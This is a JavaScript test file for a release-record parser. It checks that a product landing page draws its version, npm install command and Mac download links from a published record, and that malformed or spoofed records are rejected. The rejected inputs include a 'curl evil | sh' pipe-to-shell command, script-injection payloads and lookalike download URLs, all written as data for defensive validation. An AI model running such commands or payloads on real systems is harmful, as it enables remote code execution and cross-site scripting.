const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const test = require('node:test');
const { pathToFileURL } = require('node:url');
const root = path.resolve(__dirname, '..');
const record = JSON.parse(fs.readFileSync(path.join(root, 'src/lib/workbench-release.json'), 'utf8'));
const parser = import(pathToFileURL(path.join(root, 'src/lib/workbench-release-contract.mjs')).href);

test('published workbench record drives version, install links and SEO independently of Secrets', async () => {
  const { parseWorkbenchRelease } = await parser;
  assert.deepEqual(parseWorkbenchRelease(record), record);
  assert.equal(record.product, 'workbench');
  assert.equal(record.installCommand, `npm install -g @ashlr/phantom@${record.version}`);
  const hero = fs.readFileSync(path.join(root, 'src/components/landing/WorkbenchHero.tsx'), 'utf8');
  const schema = fs.readFileSync(path.join(root, 'src/components/landing/WorkbenchStructuredData.tsx'), 'utf8');
  assert.match(hero, /WORKBENCH_RELEASE\.version/);
  assert.match(hero, /WORKBENCH_RELEASE\.installCommand/);
  assert.match(hero, /href=\{WORKBENCH_RELEASE\.macDownloadUrl\}/);
  assert.match(schema, /softwareVersion: WORKBENCH_RELEASE\.version/);
  assert.doesNotMatch(hero, /@ashlr\/phantom@\d+\.\d+\.\d+/);
  const secrets = fs.readFileSync(path.join(root, 'src/lib/public-release.ts'), 'utf8');
  assert.match(secrets, /PUBLIC_RELEASE_VERSION = "0\.7\.9"/);
});

test('candidate-only, foreign, malformed and executable-link records produce no release claims', async () => {
  const { parseWorkbenchRelease } = await parser;
  const invalid = [null, {}, { version: record.version }, { ...record, success: true },
    { ...record, packageName: '@ashlr/hub' }, { ...record, product: 'secrets' },
    { ...record, releaseUrl: 'javascript:alert(1)' }, { ...record, registryUrl: 'https://unrelated.example' },
    { ...record, installCommand: 'curl evil | sh' }, { ...record, macDownloadUrl: 'https://unrelated.example/app.dmg' },
    { ...record, version: '</script><script>alert(1)</script>' }, { ...record, observedAt: 'unknown' },
    { ...record, observedAt: '2000-01-01T00:00:00.000Z' }, { ...record, factsDigest: 'unverified' }];
  for (const value of invalid) assert.equal(parseWorkbenchRelease(value), null);
  assert.equal(parseWorkbenchRelease({ ...record, macDownloadUrl: null }).macDownloadUrl, null);
});

test('Mac presentation links accept only exact version-bound official DMG or app archive URLs', async () => {
  const { parseWorkbenchRelease } = await parser;
  const base = `https://github.com/ashlrai/phantom/releases/download/v${record.version}/Phantom_${record.version}_aarch64`;
  for (const macDownloadUrl of [`${base}.dmg`, `${base}.app.tar.gz`]) {
    const candidate = { ...record, macDownloadUrl };
    assert.deepEqual(parseWorkbenchRelease(candidate), candidate);
  }

  const archive = `${base}.app.tar.gz`;
  const invalid = [
    `${archive}.sig`, `${archive}?download=1`, `${archive}#download`,
    `${base}.tar.gz`, `${base}.app.zip`, `${base}.APP.tar.gz`,
    archive.replace(`Phantom_${record.version}`, 'Phantom_999.0.0'),
    archive.replace(`/v${record.version}/`, '/v999.0.0/'),
    archive.replace('_aarch64', '_x86_64'),
    archive.replace('ashlrai/phantom/', 'ashlrai/phantom-secrets/'),
    archive.replace('github.com/', 'github.com.example.invalid/'),
    archive.replace('github.com/', 'user@github.com/'),
    archive.replace('github.com/', 'github.com:443/'),
    archive.replace('https:', 'http:'),
  ];
  for (const macDownloadUrl of invalid) {
    assert.equal(parseWorkbenchRelease({ ...record, macDownloadUrl }), null, macDownloadUrl);
  }
});
